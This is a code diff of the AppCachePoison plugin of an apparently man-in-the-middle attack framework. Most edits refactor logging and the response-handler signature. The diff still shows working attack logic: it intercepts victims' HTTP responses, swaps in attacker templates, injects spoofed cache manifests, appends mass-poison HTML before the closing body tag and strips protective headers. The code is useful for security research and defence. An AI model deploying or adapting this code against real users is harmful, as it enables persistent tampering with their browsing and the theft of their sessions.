@@ -1,6 +1,6 @@
 #!/usr/bin/env python2.7
 
-# Copyright (c) 2014-2016 Marcello Salvati
+# Copyright (c) 2014-2016 Krzysztof Kotowicz, Marcello Salvati
 #
 # This program is free software; you can redistribute it and/or
 # modify it under the terms of the GNU General Public License as
@@ -18,8 +18,6 @@
 # USA
 #
 
-# 99.9999999% of this code was stolen from https://github.com/koto/sslstrip by Krzysztof Kotowicz
-
 import logging
 import re 
 import os.path
@@ -33,10 +31,9 @@ from core.sslstrip.URLMonitor import URLMonitor
 mitmf_logger = logging.getLogger("mitmf")
 
 class AppCachePlugin(Plugin):
-    name       = "App Cache Poison"
+    name       = "AppCachePoison"
     optname    = "appoison"
     desc       = "Performs App Cache Poisoning attacks"
-    implements = ["handleResponse"]
     version    = "0.3"
     has_opts   = False
 
@@ -47,7 +44,9 @@ class AppCachePlugin(Plugin):
 
         self.urlMonitor.setAppCachePoisoning()
 
-    def handleResponse(self, request, data):
+    def serverResponse(self, response, request, data):
+
+        #This code was literally copied + pasted from Koto's sslstrip fork, def need to clean this up in the near future
 
         self.app_config = self.config['AppCachePoison'] # so we reload the config on each request
         url = request.client.uri
@@ -60,22 +59,22 @@ class AppCachePlugin(Plugin):
         if "enable_only_in_useragents" in self.app_config:
             regexp = self.app_config["enable_only_in_useragents"]
             if regexp and not re.search(regexp,req_headers["user-agent"]):
-                mitmf_logger.info("%s Tampering disabled in this useragent (%s)" % (ip, req_headers["user-agent"]))
-                return {'request': request, 'data': data}
+                mitmf_logger.info("{} [{}] Tampering disabled in this useragent ({})".format(ip, self.name, req_headers["user-agent"]))
+                return {'response': response, 'request': request, 'data': data}
                
         urls = self.urlMonitor.getRedirectionSet(url)
-        mitmf_logger.debug("%s [AppCachePoison] Got redirection set: %s" % (ip, urls))
+        mitmf_logger.debug("{} [{}] Got redirection set: {}".format(ip,self.name, urls))
         (name,s,element,url) = self.getSectionForUrls(urls)
 
         if s is False:
           data = self.tryMassPoison(url, data, headers, req_headers, ip)
-          return {'request': request, 'data': data}
+          return {'response': response, 'request': request, 'data': data}
 
-        mitmf_logger.info("%s Found URL %s in section %s" % (ip, url, name))
+        mitmf_logger.info("{} [{}] Found URL {} in section {}".format(ip, self.name, url, name))
         p = self.getTemplatePrefix(s)
 
         if element == 'tamper':
-          mitmf_logger.info("%s Poisoning tamper URL with template %s" % (ip, p))
+          mitmf_logger.info("{} [{}] Poisoning tamper URL with template {}".format(ip, self.name, p))
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -92,12 +91,12 @@ class AppCachePlugin(Plugin):
           data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
           
         elif element == "manifest":
-          mitmf_logger.info("%s Poisoning manifest URL" % ip)
+          mitmf_logger.info("{} [{}] Poisoning manifest URL".format(ip, self.name))
           data = self.getSpoofedManifest(url, s)
           headers.setRawHeaders("Content-Type", ["text/cache-manifest"])
 
         elif element == "raw": # raw resource to modify, it does not have to be html
-          mitmf_logger.info("%s Poisoning raw URL" % ip)
+          mitmf_logger.info("{} [{}] Poisoning raw URL".format(ip, self.name))
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -112,7 +111,7 @@ class AppCachePlugin(Plugin):
         
         self.cacheForFuture(headers)
         self.removeDangerousHeaders(headers)
-        return {'request': request, 'data': data}
+        return {'response': response, 'request': request, 'data': data}
 
     def tryMassPoison(self, url, data, headers, req_headers, ip):
         browser_id = ip + req_headers.get("user-agent", "")
@@ -130,7 +129,7 @@ class AppCachePlugin(Plugin):
         if not re.search(self.app_config['mass_poison_url_match'], url): #different url
             return data
         
-        mitmf_logger.debug("Adding AppCache mass poison for URL %s, id %s" % (url, browser_id))
+        mitmf_logger.debug("[{}] Adding AppCache mass poison for URL {}, id {}".format(self.name, url, browser_id))
         appendix = self.getMassPoisonHtml()
         data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
         self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
@@ -202,5 +201,3 @@ class AppCachePlugin(Plugin):
                   return (name, section, 'raw',url)
 
         return (None, False,'',urls.copy().pop())
-
-
